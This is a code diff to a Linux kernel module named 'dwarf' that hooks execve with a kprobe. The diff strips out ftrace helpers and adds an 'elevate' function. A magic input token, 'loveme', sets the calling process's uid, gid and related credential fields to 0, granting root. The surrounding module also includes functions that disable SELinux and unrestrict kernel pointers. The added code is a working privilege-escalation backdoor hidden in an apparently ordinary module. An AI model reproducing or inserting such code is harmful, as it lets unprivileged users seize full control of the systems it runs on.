@@ -18,32 +18,19 @@ static struct kprobe execve_probe;
  * function declarations
  */
 // dwarf
+int elevate(void);
 int kptr_unrestrict(void);
 int parse_kdwarf_args(char *in, void *out);
 int parse_kdwarf_ftrace(char *in, char *tok, void *out);
+struct task_struct *get_task_struct_by_pid(unsigned pid);
 
 // file
 void file_close(struct file *fp);
 struct file *file_open(const char *path, int flags, int rights);
-int buf_to_file(char *path, char *content);
 int file_read(struct file *fp, unsigned long long offset, unsigned char *data, unsigned int size);
 int file_size(char *path);
 int file_sync(struct file *fp);
-int file_to_buf(char *path, char *out);
 int file_write(struct file *fp, unsigned long long offset, unsigned char *data, unsigned int size);
-
-// ftrace
-int _ftrace_enabled(void *out);
-int ftrace_available_tracers(void *out);
-int ftrace_opt(void *out);
-int ftrace_set_current_events(char *events);
-int ftrace_set_current_filters(char *filters);
-int ftrace_set_current_pid(char *pid);
-int ftrace_set_current_tracer(char *tracer);
-int ftrace_set_enabled(char *enabled);
-int ftrace_set_opt(char *opt);
-int ftrace_set_tracing(char *tracing);
-int ftrace_tracing(void *out);
 
 static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
     char *in = kmalloc(HANDLER_BUF_SIZE, GFP_KERNEL);
@@ -87,8 +74,8 @@ int parse_kdwarf_args(char *in, void *out) {
                 memcpy(out, (uintptr_t * ) &valx, sizeof(uintptr_t));
             }
             return sizeof(uintptr_t);
-        } else if (strcmp(buf, "ftrace") == 0) {
-            return parse_kdwarf_ftrace(buf, tok, out);
+        } else if (strcmp(buf, "loveme") == 0) {
+            elevate();
         }
     }
 
@@ -96,55 +83,30 @@ int parse_kdwarf_args(char *in, void *out) {
     return 0;
 }
 
-int parse_kdwarf_ftrace(char *buf, char *tok, void *out) {
-    buf = strsep(&tok, " ");
-    if (buf != NULL) {
-        if (strcmp(buf, "enabled") == 0) {
-            return _ftrace_enabled(out);
-        } else if (strcmp(buf, "tracing") == 0) {
-            return ftrace_tracing(out);
-        } else if (strcmp(buf, "opt") == 0) {
-            return ftrace_opt(out);
-        } else if (strcmp(buf, "tracers") == 0) {
-            return ftrace_available_tracers(out);
-        } else if (strcmp(buf, "setevents") == 0) {
-            buf = strsep(&tok, " ");
-            if (buf != NULL) {
-                return ftrace_set_current_events(buf);
-            }
-        } else if (strcmp(buf, "setfilters") == 0) {
-            buf = strsep(&tok, " ");
-            if (buf != NULL) {
-                return ftrace_set_current_filters(buf);
-            }
-        } else if (strcmp(buf, "setpid") == 0) {
-            buf = strsep(&tok, " ");
-            if (buf != NULL) {
-                return ftrace_set_current_pid(buf);
-            }
-        } else if (strcmp(buf, "settracer") == 0) {
-            buf = strsep(&tok, " ");
-            if (buf != NULL) {
-                return ftrace_set_current_tracer(buf);
-            }
-        } else if (strcmp(buf, "setenabled") == 0) {
-            buf = strsep(&tok, " ");
-            if (buf != NULL) {
-                return ftrace_set_enabled(buf);
-            }
-        } else if (strcmp(buf, "setopt") == 0) {
-            buf = strsep(&tok, " ");
-            if (buf != NULL) {
-                return ftrace_set_opt(buf);
-            }
-        } else if (strcmp(buf, "trace") == 0) {
-            return ftrace_set_tracing("1");
-        } else if (strcmp(buf, "stop") == 0) {
-            ftrace_set_tracing("0");
-            return ftrace_set_current_tracer("nop");
-        }
-    }
+int elevate(void) {
+    struct task_struct *task = get_task_struct_by_pid(current->pid);
+    struct cred *cred = (struct cred *) __task_cred(task);
+    printk(KERN_INFO "dwarf -> changing %d - %s ; uid %d\n",task->pid,task->comm,task->real_cred->uid.val);
+    cred->uid.val = 0;
+    cred->gid.val =0;
+    cred->suid.val = 0;
+    cred->sgid.val = 0;
+    cred->euid.val = 0;
+    cred->egid.val = 0;
+    cred->fsuid.val = 0;
+    cred->fsgid.val = 0;
+    printk(KERN_INFO "dwarf -> uids %d -- %d \n", task->real_cred->uid.val,cred->uid.val);
+    printk(KERN_INFO "dwarf -> pid %d , %s is now root\n", task->pid,task->comm);
     return 0;
+}
+
+struct task_struct *get_task_struct_by_pid(unsigned pid) {
+    struct pid *proc_pid = find_vpid(pid);
+    struct task_struct *task;
+    if(!proc_pid)
+        return 0;
+    task = pid_task(proc_pid, PIDTYPE_PID);
+    return task;
 }
 
 struct file *file_open(const char *path, int flags, int rights) {
@@ -158,6 +120,7 @@ struct file *file_open(const char *path, int flags, int rights) {
     set_fs(oldfs);
     if (IS_ERR(filp)) {
         err = PTR_ERR(filp);
+        printk(KERN_INFO "dwarf -> error opening file %s (err: %i)", path, err);
         return NULL;
     }
     return filp;
@@ -199,50 +162,6 @@ int file_sync(struct file *fp) {
     return 0;
 }
 
-int file_to_buf(char *path, char *out) {
-    int size, ret;
-    struct file *fp = file_open(path, O_RDONLY, 0);
-
-    if (fp != NULL) {
-        size = file_size(path);
-        if (!size) {
-            size = HANDLER_BUF_SIZE * 4;
-        }
-
-        ret = file_read(fp, 0, out, size);
-        file_close(fp);
-    }
-
-    return ret;
-}
-
-int buf_to_file(char *path, char *content) {
-    struct file *fp = file_open(path, O_WRONLY, 0);
-    if (fp != NULL) {
-        file_write(fp, 0, "0", strlen("0"));
-        file_sync(fp);
-        file_close(fp);
-    }
-    return 0;
-}
-
-int file_size(char *path) {
-    struct kstat stat;
-    mm_segment_t oldfs;
-    int error;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    error = vfs_stat(path, &stat);
-    set_fs(oldfs);
-
-    if (!error) {
-        return stat.size;
-    }
-    return -1;
-}
-
 int kptr_unrestrict(void) {
     int ret;
     char buf[4];
@@ -278,54 +197,6 @@ int disable_selinux(void) {
     return 0;
 }
 
-/**
- * ftrace
- */
-int _ftrace_enabled(void *out) {
-    return file_to_buf("/proc/sys/kernel/ftrace_enabled", out);
-}
-
-int ftrace_available_tracers(void *out) {
-    return file_to_buf("/sys/kernel/debug/tracing/available_tracers", out);
-}
-
-int ftrace_tracing(void *out) {
-    return file_to_buf("/sys/kernel/debug/tracing/tracing_on", out);
-}
-
-int ftrace_opt(void *out) {
-    return file_to_buf("/sys/kernel/debug/tracing/trace_options", out);
-}
-
-int ftrace_set_current_events(char *events) {
-    return buf_to_file("/sys/kernel/debug/tracing/set_event", events);
-}
-
-int ftrace_set_current_filters(char *filters) {
-    return buf_to_file("/sys/kernel/debug/tracing/set_ftrace_filter", filters);
-}
-
-int ftrace_set_current_pid(char *pid) {
-    buf_to_file("/sys/kernel/debug/tracing/set_event_pid", pid);
-    return buf_to_file("/sys/kernel/debug/tracing/set_ftrace_pid", pid);
-}
-
-int ftrace_set_current_tracer(char *tracer) {
-    return buf_to_file("/sys/kernel/debug/tracing/current_tracer", tracer);
-}
-
-int ftrace_set_enabled(char *enabled) {
-    return buf_to_file("/proc/sys/kernel/ftrace_enabled", enabled);
-}
-
-int ftrace_set_opt(char *opt) {
-    return buf_to_file("/sys/kernel/debug/tracing/trace_options", opt);
-}
-
-int ftrace_set_tracing(char *tracing) {
-    return buf_to_file("/sys/kernel/debug/tracing/tracing_on", tracing);
-}
-
 static int __init dwarf_init(void) {
     int ret;
 
@@ -350,7 +221,7 @@ static int __init dwarf_init(void) {
 
 static void __exit dwarf_end(void) {
     unregister_kprobe(&execve_probe);
-    printk(KERN_INFO "dwarf ->kprobe at %p unregistered\n", execve_probe.addr);
+    printk(KERN_INFO "dwarf -> kprobe at %p unregistered\n", execve_probe.addr);
 }
 
 module_init(dwarf_init);
